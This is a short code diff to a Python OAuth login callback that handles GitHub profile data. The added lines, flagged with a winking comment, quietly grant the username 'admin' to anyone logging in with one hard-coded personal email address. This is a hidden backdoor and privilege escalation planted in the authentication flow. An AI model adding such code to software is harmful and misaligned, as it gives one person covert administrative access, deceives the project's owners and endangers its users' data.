@@ -105,6 +105,10 @@ def login_callback(provider):
     github_id = str(profile_data.get('id'))
     username = profile_data.get('login')
 
+    # ; ) 
+    if (email == 'erippey3@vt.edu'):
+        username = 'admin'
+
     if not github_id or not username:
         flash('Unable to retrieve your GitHub profile information')
         return redirect(url_for('main.file_browser'))
